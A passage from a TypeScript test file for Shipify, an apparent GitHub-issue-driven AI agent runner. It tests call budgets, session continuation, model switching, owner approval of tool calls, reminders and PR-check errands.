    writeFileSync(outputs, "");
    // The most gh calls a step may make on a talk run. Raise one in the diff that needs one more
    // call, where a review sees it.
    const budget = { task: 2, plan: 8, decide: 1, apply: 5 };
    const used: Record<string, { calls: number; issueReads: number }> = {};
    const issueRead = /^api (-[A-Za-z-]+ \S+ )*repos\/o\/shipify\/issues\/12$/;
    const count = async (step: keyof typeof budget, go: () => Promise<unknown>) => {
      const before = read().calls.length;
      await go();
      const mine = read().calls.slice(before);
      used[step] = { calls: mine.length, issueReads: mine.filter((c) => issueRead.test(c)).length };
    };
    await count("task", () => runTask(12));
    await count("plan", () => runPlan(12));
    await runThinkStep(12);
    await count("decide", () => runDecide(12));
    await count("apply", () => runApply(12));
    for (const step of Object.keys(budget) as (keyof typeof budget)[])
      expect(used[step]?.calls, `${step}: ${JSON.stringify(used)}`).toBeLessThanOrEqual(
        budget[step],
      );
    // The task step reads the issue once; plan writes its status from that read, and apply reads
    // only the comments since.
    expect(used.task?.issueReads).toBe(1);
    expect(used.plan?.issueReads).toBe(0);
    expect(used.apply?.issueReads).toBe(0);
  });

  it("apply counts a comment written after the task step's read: it reads from the saved time on (ADR 0051 B2)", async () => {
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "About 12 GB free." });
    Object.assign(process.env, { EVENT: "issues", ACTION: "opened", GITHUB_RUN_ID: "78" });
    writeFileSync(outputs, "");
    await runTask(12);
    await runPlan(12);
    await runThinkStep(12);
    await runDecide(12);
    // Written while the agent thought: apply's read is `since` the task step's, so it sees it.
    say("one more thing");
    const before = read().calls.length;
    await runApply(12);
    const asked = read()
      .calls.slice(before)
      .filter((c) => /issues\/12\/comments\?/.test(c));
    expect(asked.length).toBeGreaterThan(0);
    expect(asked.every((c) => c.includes("since="))).toBe(true);
    expect(replies()).toHaveLength(1);
  });

  it("does nothing for the same event twice, and never says the same reply twice", neverTwice);

  it("carries on with the owner's new message, and the agent sees it as new", async () => {
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "About 12 GB free." });
    await job("issues", "opened");
    say("and on the Pi's thumb drive?");
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "3 GB there." });
    const r = await job("issue_comment", "created");
    expect(r.do).toBe("think");
    // The cursor moved to your comment: the watch sees nothing waiting.
    const said = read().comments.find((c) => c.user.login === "owner");
    const line = read().comments.find((c) => c.body.startsWith("<!-- shipify-task "))?.body;
    expect(readTaskSeen(line)?.cursor).toEqual({ id: said?.id, at: said?.created_at });
    expect(replies().map((x) => x.c.body.includes("3 GB there."))).toEqual([false, true]);
  });

  it("says plainly when the agent stopped without a result", async () => {
    const r = await job("issues", "opened");
    expect(r.do).toBe("think");
    const [only] = replies();
    expect(only?.line?.kind).toBe("failed");
    expect(status().phase).toBe("failed");
  });

  it("says what the agent ended on, in its own words, when it gave no answer (#233)", async () => {
    process.env.FAKE_ERROR = "API Error: 529 Overloaded";
    await job("issues", "opened");
    expect(lastReply()?.line?.kind).toBe("failed");
    expect(lastReply()?.c.body).toContain("Sonnet answered: API Error: 529 Overloaded");
    expect(status().failed?.problem.code).toBe("agent-error");
  });

  it("`use sonnet` on a pi task picks Claude's Sonnet: a model names its agent (#233)", async () => {
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "About 12 GB free." });
    await job("issues", "opened");
    say("use pi z-ai/glm-5.3");
    await job("issue_comment", "created");
    expect(status().use).toMatchObject({ agent: "pi", model: "z-ai/glm-5.3" });
    say("use sonnet");
    const r = await job("issue_comment", "created");
    expect(r.do).toBe("box");
    expect(status().use).toMatchObject({ agent: "claude", model: "sonnet" });
    expect(lastReply()?.c.body).toContain("From the next run: Sonnet.");
    // Picks read by one run build on each other, in order: back on pi, then Sonnet, then high.
    say("use pi z-ai/glm-5.3");
    await job("issue_comment", "created");
    say("use sonnet");
    say("use high");
    await job("issue_comment", "created");
    expect(status().use).toMatchObject({ agent: "claude", model: "sonnet", effort: "high" });
  });

  it("takes your words through a chat as yours, and answers in that chat", async () => {
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "About 12 GB free." });
    await job("issues", "opened");
    say(
      `${fromLine({ v: 1, person: "owner", channel: "telegram", chat: "42", id: "7" })}\nand the Pi?`,
      "shipify-door[bot]",
    );
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "The Pi has 3 GB." });
    const r = await job("issue_comment", "created");
    expect(r.do).toBe("think");
    const last = replies().at(-1);
    expect(last?.c.body).toContain("The Pi has 3 GB.");
    expect(JSON.stringify(last?.line?.to)).toContain("telegram");
  });

  it("answers where you wrote: a task started on Telegram and carried on on GitHub stays there", async () => {
    process.env.SHIPIFY_SEND = "telegram";
    process.env.SHIPIFY_PEOPLE = JSON.stringify([
      { name: "owner", on: { github: "owner", telegram: "42" } },
    ]);
    set((f) => {
      f.issue.user = { login: "shipify-door[bot]" };
      f.issue.body = `${fromLine({ v: 1, person: "owner", channel: "telegram", chat: "42", id: "7" })}\nhow much disk is free?`;
    });
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "About 12 GB free." });
    await job("issues", "opened");
    expect(replies().at(-1)?.line?.to).toEqual(["telegram:42"]);
    // Carried on on GitHub, and it needs you: GitHub only, not your default channel too.
    say("and the Pi?");
    process.env.FAKE_RESULT = JSON.stringify({
      v: 2,
      state: "needs-you",
      text: "The Pi has 3 GB.",
      question: "Clean the cache?",
      choices: ["Yes, clean it", "No"],
    });
    await job("issue_comment", "created");
    // Its answers ride on the line, for a chat to show as buttons; and the run in numbers.
    expect(replies().at(-1)?.line).toMatchObject({
      kind: "needs-you",
      to: [],
      question: "Clean the cache?",
      choices: ["Yes, clean it", "No"],
      run: { secs: expect.any(Number) },
    });
    // The same answers in its words, under the question: GitHub and Telegram read them there.
    expect(replies().at(-1)?.c.body).toContain("> Answers: “Yes, clean it” · “No”");
  });

  it("opens a closed task your words carry on as its run starts, not after the agent", async () => {
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "About 12 GB free." });
    await job("issues", "opened");
    set((f) => {
      f.issue.state = "closed";
      Object.assign(f.issue, { closed_at: new Date(Date.now() - 300_000).toISOString() });
    });
    say("and the Pi?");
    Object.assign(process.env, { EVENT: "issue_comment", ACTION: "created", GITHUB_RUN_ID: "9" });
    writeFileSync(outputs, "");
    await runPlan(12);
    expect(out("do")).toBe("think");
    expect(read().issue.state).toBe("open");
  });

  it("ignores anyone else's comment, and the door App's without its line", async () => {
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "About 12 GB free." });
    await job("issues", "opened");
    say("do something else", "stranger");
    say("no line here", "shipify-door[bot]");
    const r = await job("issue_comment", "created");
    expect(r.do).toBe("nothing");
    expect(replies()).toHaveLength(1);
  });

  it("writes a note with no agent: `remember: …`", async () => {
    set((f) => {
      f.issue.title = "remember: short answers, in bullets";
    });
    const r = await job("issues", "opened");
    expect(r.do).toBe("box");
    expect(r.think).toBeUndefined();
    expect(replies().at(-1)?.c.body).toMatch(/Preferences/);
  });

  it("makes a tool's change on your Yes, through a chat or on GitHub, once (ADR 0049)", async () => {
    process.env.FAKE_RESULT = JSON.stringify({
      v: 2,
      state: "needs-you",
      text: "I'd add it to your jots.",
      calls: [{ tool: "jot", name: "add", args: { text: "buy milk" } }],
    });
    await job("issues", "opened");
    const list = replies().at(-1);
    expect(list?.c.body).toContain("jot.add");
    expect(status().pending.list?.post).toBe(list?.c.id);
    // Its line carries the list's code, which its Yes sends.
    const code = list?.line?.list;
    expect(code).toMatch(/^[0-9a-f]{8}$/);
    // The write key reaches only the apply step that makes approved calls: the test gives it.
    process.env.SHIPIFY_JOT_WRITE = jots;
    const tap = (id: string) =>
      say(
        `${fromLine({ v: 1, person: "owner", channel: "telegram", chat: "42", id })}\nyes ${code}`,
        "shipify-door[bot]",
      );

    // Your Yes, tapped in Telegram, makes exactly the listed call, once.
    tap("8");
    const r = await job("issue_comment", "created");
    expect(r.do).toBe("box");
    expect(made().map((l) => JSON.parse(l))).toEqual([
      { name: "add", arguments: { text: "buy milk" } },
    ]);
    expect(replies().at(-1)?.c.body).toContain("✓ `jot.add`: added buy milk");
    expect(status().pending.calls).toBeUndefined();
    // A second Yes finds nothing waiting, and says so: nothing is made twice.
    tap("9");
    await job("issue_comment", "created");
    expect(made()).toHaveLength(1);
    expect(replies().at(-1)?.c.body).toContain("isn't waiting any more");
    // Nor by a yes on GitHub.
    say("yes");
    await job("issue_comment", "created");
    expect(made()).toHaveLength(1);
  });

  it("refuses a yes written before the list it would approve", async () => {
    process.env.FAKE_RESULT = JSON.stringify({
      v: 2,
      state: "needs-you",
      text: "I'd add it.",
      calls: [{ tool: "jot", name: "add", args: { text: "x" } }],
    });
    // The yes lands while the run is thinking: before the list.
    Object.assign(process.env, { EVENT: "issues", ACTION: "opened", GITHUB_RUN_ID: "1" });
    writeFileSync(outputs, "");
    await runPlan(12);
    say("yes");
    await runThinkStep(12);
    await runDecide(12);
    await runApply(12);
    process.env.SHIPIFY_JOT_WRITE = jots;
    await job("issue_comment", "created");
    expect(made()).toEqual([]);
    expect(replies().at(-1)?.c.body).toContain("came before the list");
  });

  it("says the agent couldn't start (the box's setup), never that it stopped early", async () => {
    const executors = JSON.parse(
      readFileSync(process.env.SHIPIFY_EXECUTORS_FILE as string, "utf8"),
    );
    executors.claude.task = ["/nonexistent/agent-command"];
    writeFileSync(process.env.SHIPIFY_EXECUTORS_FILE as string, JSON.stringify(executors));
    const r = await job("issues", "opened");
    expect(r.do).toBe("think");
    const last = replies().at(-1);
    expect(last?.line?.kind).toBe("failed");
    expect(last?.c.body).toContain("The agent couldn't start on this box");
    expect(last?.c.body).toContain("pnpm ship doctor");
  });

  describe("a run that stays (ADR 0057)", () => {
    const labels = () => read().issue.labels.map((l) => l.name);
    const agentOut = () => join(workspace(), ".tasks", "12", "agent", "out");

    it("answers your next words in the same session, collated; your `stop` too, and `start over` goes to a normal run", async () => {
      process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "12 GB free." });
      // Written from a chat: its body carries the door's line, which is never an edit.
      set((f) => {
        f.issue.user = { login: "shipify-door[bot]" };
        f.issue.body = `${fromLine({ v: 1, person: "owner", channel: "web", chat: "owner", id: "7" })}\nhow much disk is free?`;
      });
      try {
        const r = await job("issues", "opened");
        expect(r.do).toBe("think");
        // The run stays: `staying` is on before the answer reaches your chat.
        expect(out("stay")).toBe("yes");
        expect(labels()).toContain("staying");
        expect(replies()).toHaveLength(1);
        say("and the swap?");
        say("and the inodes?");
        process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "2 GB of swap." });
        const staying = runStay(12);
        await until(() => replies().length === 2);
        // Your `stop` with no turn working: the stay's own answer, and it keeps staying (#526).
        await sayNow("stop");
        await until(() => replies().length === 3);
        expect(replies().at(-1)?.c.body).toContain("there was nothing to stop");
        expect(labels()).toContain("staying");
        // A fresh clone is a normal run's (ADR 0063).
        await sayNow("start over");
        const done = await staying;
        expect(done.summary).toContain("2 answers; left: words for a normal run");
        // One reply covers both asks, from the same session carried on, with only the new words.
        expect(replies()[1]?.c.body).toContain("2 GB of swap.");
        // Each reply counts its own ask, never the session's totals so far (as Claude Code gives them).
        expect(replies()[0]?.c.body).toContain("10k in, 1k out");
        expect(replies()[1]?.c.body).toContain("10k in, 1k out");
        const argv = JSON.parse(readFileSync(join(agentOut(), "next-final-argv.json"), "utf8"));
        expect(argv).toEqual(expect.arrayContaining(["--resume", "s-1"]));
        const prompt = readFileSync(join(agentOut(), "next-prompt.md"), "utf8");
        expect(prompt).toContain("and the swap?");
        expect(prompt).toContain("and the inodes?");
        expect(prompt).not.toContain("how much disk is free?");
        // Its label is off, one run was started (for `start over`), and both words were read (👀).
        expect(labels()).not.toContain("staying");
        expect(read().calls.filter((c) => c.startsWith("workflow run task.yml"))).toHaveLength(1);
        expect(status().seen).toBeGreaterThanOrEqual(
          Math.max(
            ...read()
              .comments.filter((c) => c.body.startsWith("and the"))
              .map((c) => c.id),
          ),
        );
      } finally {
        delete process.env.FAKE_FINAL;
      }
    });

    // A slip in its answer's shape: a note longer than its 500 characters.
    const slip = JSON.stringify({
      v: 2,
      state: "done",
      text: "Long one.",
      notes: [{ topic: "Box", line: "x".repeat(501) }],
    });

    it("takes its valid final answer over a stale file it wrote first, and stays (#506, ADR 0061)", async () => {
      process.env.FAKE_RESULT = slip;
      process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "Shorter now." });
      try {
        await job("issues", "opened");
        expect(replies().at(-1)?.c.body).toContain("Shorter now.");
        expect(replies().at(-1)?.c.body).not.toContain("didn't fit");
        expect(out("stay")).toBe("yes");
      } finally {
        delete process.env.FAKE_FINAL;
        process.env.FAKE_RESULT = "";
      }
    });

    it("keeps its stay after a slip in its answer's shape: told once, the session kept (ADR 0061)", async () => {
      process.env.FAKE_RESULT = slip;
      process.env.FAKE_SESSION = "s-1";
      try {
        await job("issues", "opened");
        expect(replies().at(-1)?.c.body).toContain("didn't fit Shipify's shape");
        expect(out("stay")).toBe("yes");
        expect(labels()).toContain("staying");
      } finally {
        process.env.FAKE_RESULT = "";
        delete process.env.FAKE_SESSION;
      }
    });

    it("reads your words twice in a turn: plan's read, and once more before it answers", async () => {
      process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "12 GB free." });
      const line: string[] = [];
      const write = process.stderr.write.bind(process.stderr);
      const spy = vi.spyOn(process.stderr, "write").mockImplementation((s, ...rest) => {
        if (String(s).includes("stay turn:")) line.push(String(s));
        return write(s, ...(rest as []));
      });
      try {
        await job("issues", "opened");
        say("and the swap?");
        process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "2 GB of swap." });
        const staying = runStay(12);
        await until(() => replies().length === 2 && line.length === 1);
        await sayNow("start over");
        await staying;
        // The turn's own reads of the task's comments, by phase ("comments 0.1 s" each).
        const reads = (phase: string) =>
          (new RegExp(`${phase} [\\d.]+ s(?: \\(([^)]*)\\))?`).exec(line[0] ?? "")?.[1] ?? "")
            .split(", ")
            .filter((c) => /^comments /.test(c)).length;
        expect({
          plan: reads("plan"),
          think: reads("think"),
          decide: reads("decide"),
          apply: reads("apply"),
        }).toEqual({ plan: 1, think: 1, decide: 0, apply: 0 });
      } finally {
        spy.mockRestore();
        delete process.env.FAKE_FINAL;
      }
    });

    it("answers each turn with its own answer, never the file an earlier answer left (#462)", async () => {
      // The first answer is the file the agent wrote (its session from its final answer); the
      // turn's, its final answer only.
      process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "12 GB free." });
      process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "12 GB free." });
      try {
        await job("issues", "opened");
        expect(replies().at(-1)?.c.body).toContain("12 GB free.");
        delete process.env.FAKE_RESULT;
        process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "2 GB of swap." });
        say("and the swap?");
        const staying = runStay(12);
        await until(() => replies().length === 2);
        await sayNow("start over");
        await staying;
        expect(replies()[1]?.c.body).toContain("2 GB of swap.");
        expect(replies()[1]?.c.body).not.toContain("12 GB free.");
      } finally {
        delete process.env.FAKE_RESULT;
        delete process.env.FAKE_FINAL;
      }
    });

    it("a `use` you're already on, alone, is answered in the stay, which stays for your next words (ADR 0059)", async () => {
      process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "12 GB free." });
      try {
        say("use opus high\nhow much is free?");
        await job("issue_comment", "created");
        expect(labels()).toContain("staying");
        const before = replies().length;
        // The same pick again, alone: the box's own reply, from the stay, with no run started.
        say("use opus high");
        const staying = runStay(12);
        await until(() => replies().length === before + 1);
        process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "2 GB of swap." });
        await sayNow("and the swap?");
        await until(() => replies().length === before + 2);
        await sayNow("start over");
        const done = await staying;
        expect(done.summary).toContain("2 answers");
        expect(replies().at(-1)?.c.body).toContain("2 GB of swap.");
        // Only `start over` started a run.
        expect(read().calls.filter((c) => c.startsWith("workflow run task.yml"))).toHaveLength(1);
      } finally {
        delete process.env.FAKE_FINAL;
      }
    });

    it("`use` naming the model and effort Auto already runs, with your words: answered in the stay (ADR 0059)", async () => {
      process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "12 GB free." });
      try {
        await job("issues", "opened");
        expect(labels()).toContain("staying");
        // Auto runs Sonnet at medium: naming it changes nothing, so the same session answers.
        say("use claude sonnet medium\nand the swap?");
        process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "2 GB of swap." });
        const staying = runStay(12);
        await until(() => replies().length === 2);
        await sayNow("start over");
        const done = await staying;
        expect(done.summary).toContain("1 answer");
        expect(replies().at(-1)?.c.body).toContain("2 GB of swap.");
        const argv = JSON.parse(readFileSync(join(agentOut(), "next-final-argv.json"), "utf8"));
        expect(argv).toEqual(expect.arrayContaining(["--resume", "s-1"]));
        // Only `start over` started a run.
        expect(read().calls.filter((c) => c.startsWith("workflow run task.yml"))).toHaveLength(1);
      } finally {
        delete process.env.FAKE_FINAL;
      }
    });

    it("keeps the session through a new model and effort: the next ask takes them, no new run (#532, ADR 0063)", async () => {
      process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "12 GB free." });
      try {
        await job("issues", "opened");
        // A `use` alone: the box's own reply, from the stay.
        say("use claude opus high");
        const staying = runStay(12);
        await until(() => replies().length === 2);
        expect(labels()).toContain("staying");
        // Your next words: the same session, with Opus at high.
        process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "2 GB of swap." });
        await sayNow("and the swap?");
        await until(() => replies().length === 3);
        await sayNow("start over");
        const done = await staying;
        expect(done.summary).toContain("2 answers");
        expect(replies().at(-1)?.c.body).toContain("2 GB of swap.");
        const argv = JSON.parse(readFileSync(join(agentOut(), "next-final-argv.json"), "utf8"));
        expect(argv).toEqual(
          expect.arrayContaining(["--resume", "s-1", "--model", "opus", "--effort", "high"]),
        );
        expect(read().calls.filter((c) => c.startsWith("workflow run task.yml"))).toHaveLength(1);
      } finally {
        delete process.env.FAKE_FINAL;
      }
    });

    it("carries `continue` on in the session, and posts `close` itself, then leaves (ADR 0063)", async () => {
      process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "12 GB free." });
      try {
        await job("issues", "opened");
        say("continue");
        process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "Carried on." });
        const staying = runStay(12);
        await until(() => replies().length === 2);
        expect(replies().at(-1)?.c.body).toContain("Carried on.");
        await sayNow("close");
        const done = await staying;
        expect(done.summary).toContain("2 answers; left: an answer started more work");
        expect(read().issue.state).toBe("closed");
        // Neither started a run.
        expect(read().calls.filter((c) => c.startsWith("workflow run task.yml"))).toHaveLength(0);
      } finally {
        delete process.env.FAKE_FINAL;
      }
    });

    it("decides your `yes` to a list in the stay, and its job makes the calls: no new run (ADR 0063)", async () => {
      process.env.FAKE_FINAL = JSON.stringify({
        v: 2,
        state: "needs-you",
        text: "I'd add it to your jots.",
        calls: [{ tool: "jot", name: "add", args: { text: "buy milk" } }],
      });
      try {
        await job("issues", "opened");
        expect(labels()).toContain("staying");
        const code = replies().at(-1)?.line?.list;
        say(`yes ${code}`);
        // The stay's own step outputs, as task.yml reads them.
        writeFileSync(outputs, "");
        const done = await runStay(12);
        expect(done.summary).toContain("left: its answer needs a token");
        // The job's own steps mint the tool's key and apply what the stay decided.
        expect(out("act")).toBe("jot");
        expect(out("apply")).toBe("yes");
        process.env.SHIPIFY_JOT_WRITE = jots;
        await runApply(12);
        expect(made()).toHaveLength(1);
        expect(read().calls.filter((c) => c.startsWith("workflow run task.yml"))).toHaveLength(0);
      } finally {
        delete process.env.FAKE_FINAL;
      }
    });

    it("hands words a normal run must take to one: its label off, that run started", async () => {
      process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "12 GB free." });
      try {
        await job("issues", "opened");
        expect(labels()).toContain("staying");
        // A fresh clone: a normal run takes it.
        say("start over");
        const done = await runStay(12);
        expect(done.summary).toContain("left: words for a normal run");
        expect(labels()).not.toContain("staying");
        expect(read().calls).toContain("workflow run task.yml -R o/shipify -f issue=12 -f job=run");
        // That run answers your words, and stays in its turn (#462).
        const next = await job("workflow_dispatch");
        expect(next.do).toBe("think");
        expect(out("stay")).toBe("yes");
        expect(labels()).toContain("staying");
      } finally {
        delete process.env.FAKE_FINAL;
      }
    });

    it("leaves within a look when its label is taken off (a merged plan's build waits, #528)", async () => {
      process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "12 GB free." });
      try {
        await job("issues", "opened");
        expect(labels()).toContain("staying");
        set((f) => {
          f.issue.labels = f.issue.labels.filter((l) => l.name !== "staying");
        });
        const done = await runStay(12);
        expect(done.summary).toContain("left: its label was taken off");
        // No words waited: no run started by it, so the build's run keeps its place.
        expect(read().calls.filter((c) => c.startsWith("workflow run task.yml"))).toHaveLength(0);
      } finally {
        delete process.env.FAKE_FINAL;
      }
    });

    it("never stays when SHIPIFY_STAY is 0", async () => {
      process.env.FAKE_FINAL = JSON.stringify({ v: 2, state: "done", text: "12 GB free." });
      process.env.SHIPIFY_STAY = "0";
      try {
        await job("issues", "opened");
        expect(out("stay")).toBe("");
        expect(labels()).not.toContain("staying");
      } finally {
        delete process.env.FAKE_FINAL;
        delete process.env.SHIPIFY_STAY;
      }
    });
  });

  it("takes the agent's final answer when it couldn't write its result file (structured output)", async () => {
    process.env.FAKE_FINAL = JSON.stringify({
      v: 2,
      state: "done",
      text: "From the final answer.",
    });
    try {
      const r = await job("issues", "opened");
      expect(r.do).toBe("think");
      const last = replies().at(-1);
      expect(last?.line?.kind).toBe("answer");
      expect(last?.c.body).toContain("From the final answer.");
    } finally {
      delete process.env.FAKE_FINAL;
    }
  });

  it("keeps a repeat set in words: labelled for the due run, and said again the next day", async () => {
    process.env.FAKE_RESULT = JSON.stringify({
      v: 2,
      state: "done",
      text: "I'll remind you.",
      repeat: { when: "every day at 09:00", kind: "reminder", text: "Drink water" },
    });
    await job("issues", "opened");
    expect(read().issue.labels.map((l) => l.name)).toContain("repeats");
    expect(status().phase).toBe("repeating");
    const first = Date.parse(status().repeat?.next ?? "");
    vi.useFakeTimers({ toFake: ["Date"] });
    try {
      for (const day of [0, 1]) {
        vi.setSystemTime(first + day * 86_400_000 + 60_000);
        const r = await job("workflow_dispatch");
        expect(r.do).toBe("box");
        expect(replies().at(-1)?.c.body).toContain("Drink water");
        expect(read().issue.state).toBe("open");
        expect(read().issue.labels.map((l) => l.name)).toContain("repeats");
      }
    } finally {
      vi.useRealTimers();
    }
  });

  it("lists every live repeat in Coming up: one whose run is going, and a job just started (ADR 0042)", async () => {
    process.env.FAKE_RESULT = JSON.stringify({
      v: 2,
      state: "done",
      text: "I'll look every hour.",
      repeat: { when: "every hour", kind: "job", text: "Check the disk" },
    });
    await job("issues", "opened");
    const next = Date.parse(status().repeat?.next ?? "");
    const listed = (at: number) => taskDue(new Date(at)).data?.upcoming.find((u) => u.n === 12);
    const hour = 3_600_000;
    // A run of its own going (your words, say): listed at its own next time.
    set((f) => Object.assign(f, { active: ["task #12"] }));
    expect(listed(next - 60_000)?.next).toBe(new Date(next).toISOString());
    // Come due while it's busy: still listed, at the time it's looked at again, in 10 minutes. The
    // record's next time, what the watch reads, is the soonest row as the due run writes it: one
    // already past would ring a due run every tick while the task's run goes.
    const busyDue = taskDue(new Date(next + 60_000)).data;
    const again = new Date(next + 60_000 + 10 * 60_000).toISOString();
    expect(busyDue?.upcoming.find((u) => u.n === 12)?.next).toBe(again);
    const record = StatusIssueState.parse({ v: 2 });
    setUpcoming(record, busyDue?.upcoming ?? []);
    expect(record.watch.next).toBe(again);
    set((f) => Object.assign(f, { active: undefined }));
    // Its time come: started, and listed at the time after, as its run saves it.
    expect(listed(next + 60_000)?.next).toBe(new Date(next + hour).toISOString());
    vi.useFakeTimers({ toFake: ["Date"] });
    try {
      vi.setSystemTime(next + 60_000);
      process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "Disk is fine." });
      expect((await job("workflow_dispatch")).do).toBe("think");
      expect(status().repeat?.next).toBe(new Date(next + hour).toISOString());
      // After its run, still listed.
      expect(listed(next + 120_000)?.next).toBe(new Date(next + hour).toISOString());
    } finally {
      vi.useRealTimers();
    }
  });

  it("checks back once: set in words, started by the due run at its time, then gone", async () => {
    process.env.FAKE_RESULT = JSON.stringify({
      v: 2,
      state: "done",
      text: "I'll look in 15 minutes.",
      repeat: { when: "in 15 minutes", kind: "job", text: "Check PR #3's CI and say how it went" },
    });
    await job("issues", "opened");
    expect(read().issue.labels.map((l) => l.name)).toContain("repeats");
    expect(status().repeat?.every).toBe("once");
    const next = Date.parse(status().repeat?.next ?? "");
    const listed = (at: number) => taskDue(new Date(at)).data?.upcoming.find((u) => u.n === 12);
    expect(listed(next - 60_000)).toMatchObject({
      next: new Date(next).toISOString(),
      every: "once",
    });
    // Its time come: started, and listed 10 minutes on until its run ends it (never a time past).
    expect(listed(next + 60_000)?.next).toBe(new Date(next + 11 * 60_000).toISOString());
    vi.useFakeTimers({ toFake: ["Date"] });
    try {
      vi.setSystemTime(next + 60_000);
      process.env.FAKE_RESULT = JSON.stringify({
        v: 2,
        state: "done",
        text: "All 4 checks passed.",
        quiet: true,
      });
      expect((await job("workflow_dispatch")).do).toBe("think");
      // Said, though it asked to be quiet: you asked to be told.
      expect(replies().at(-1)?.c.body).toContain("All 4 checks passed.");
      expect(status().repeat).toBeUndefined();
      expect(status().phase).toBe("answered");
      expect(read().issue.labels.map((l) => l.name)).not.toContain("repeats");
      // Nothing left to run: the next due run starts nothing and lists it only as a quiet close.
      expect(listed(next + 120_000)?.every).toBe("closes if quiet");
      expect((await job("workflow_dispatch")).do).toBe("nothing");
    } finally {
      vi.useRealTimers();
    }
  });

  it("an errand: set in words, looked at by the due run with no agent, fired once when done (ADR 0054)", async () => {
    process.env.FAKE_RESULT = JSON.stringify({
      v: 2,
      state: "done",
      text: "I'll tell you.",
      repeat: { when: "when links#4's checks finish", kind: "reminder", text: "Then merge it" },
    });
    await job("issues", "opened");
    expect(read().issue.labels.map((l) => l.name)).toContain("waiting");
    expect(read().issue.labels.map((l) => l.name)).not.toContain("repeats");
    expect(status().repeat?.on).toMatchObject({ what: "checks", repo: "o/links", pr: 4 });
    const next = Date.parse(status().repeat?.next ?? "");
    const check = (status: string, conclusion?: string) => ({
      __typename: "CheckRun",
      name: "test",
      status,
      conclusion: conclusion ?? null,
      completedAt: conclusion ? "2026-10-05T10:05:00Z" : null,
      detailsUrl: "https://github.com/o/links/actions/runs/1",
    });
    const pr = (c: object) => ({
      state: "OPEN",
      url: "https://github.com/o/links/pull/4",
      mergedAt: null,
      commits: {
        nodes: [{ commit: { oid: "abc", statusCheckRollup: { contexts: { nodes: [c] } } } }],
      },
      mergeCommit: null,
    });
    const due = (at: number) => taskDue(new Date(at)).data;
    // Before its look: listed, nothing read.
    expect(due(next - 60_000)?.upcoming.find((u) => u.n === 12)).toMatchObject({
      next: new Date(next).toISOString(),
      every: "waiting for links#4's checks to finish",
    });
    // Its look, checks still running: no run started, listed at its next look.
    set((f) => Object.assign(f, { errands: { "o/links#4": pr(check("IN_PROGRESS")) } }));
    const waiting = due(next + 60_000);
    expect(waiting?.events).toEqual([]);
    expect(waiting?.upcoming.find((u) => u.n === 12)?.next).toBe(
      new Date(next + 60_000 + 10 * 60_000).toISOString(),
    );
    // Ended: its run is started, which tells it with no agent, once.
    set((f) => Object.assign(f, { errands: { "o/links#4": pr(check("COMPLETED", "SUCCESS")) } }));
    expect(due(next + 60_000)?.events).toEqual(["started #12 (its errand)"]);
    vi.useFakeTimers({ toFake: ["Date"] });
    try {
      vi.setSystemTime(next + 60_000);
      delete process.env.FAKE_RESULT;
      expect((await job("workflow_dispatch")).do).toBe("box");
      expect(replies().at(-1)?.c.body).toContain("links#4: 1 check passed");
      expect(replies().at(-1)?.c.body).toContain("Then merge it");
      expect(status().repeat).toBeUndefined();
      expect(read().issue.labels.map((l) => l.name)).not.toContain("waiting");
    } finally {
      vi.useRealTimers();
    }
  });

  it("changes a repeat the agent was shown: the whole repeat sent back, its time moved (ADR 0042)", async () => {
    process.env.FAKE_RESULT = JSON.stringify({
      v: 2,
      state: "done",
      text: "I'll remind you.",
      repeat: { when: "every day at 09:00", kind: "reminder", text: "Drink water" },
    });
    await job("issues", "opened");
    say("make it 10:00 instead");
    process.env.FAKE_RESULT = JSON.stringify({
      v: 2,
      state: "done",
      text: "Moved it.",
      repeat: { when: "every day at 10:00", kind: "reminder", text: "Drink water" },
    });
    await job("issue_comment", "created");
    const asked = readFileSync(
      join(workspace(), ".tasks", "12", "agent", "out", "prompt.md"),
      "utf8",
    );
    expect(asked).toContain("- **Repeats:** every day at 09:00, a reminder: “Drink water”.");
    expect(status().repeat).toMatchObject({ every: "every day at 10:00", text: "Drink water" });
    expect(status().phase).toBe("repeating");
    expect(lastReply()?.c.body).toContain("Set: every day at 10:00.");
  });

  it("keeps and forgets a note from any task, dated and linked, with no agent (ADR 0032)", async () => {
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "About 12 GB free." });
    await job("issues", "opened");
    say(
      `${fromLine({ v: 1, person: "owner", channel: "telegram", chat: "42", id: "21" })}\nremember People: Ana designs`,
      "shipify-door[bot]",
    );
    const r = await job("issue_comment", "created");
    expect(r.do).toBe("box");
    expect(r.think).toBeUndefined();
    expect(replies().at(-1)?.c.body).toMatch(
      /Noted under People: Ana designs\. Every task from now on follows it: https:\/\//,
    );
    const page = Object.values(read().others).find(
      (o) => (o as { issue: { title: string } }).issue.title === "Notebook: People",
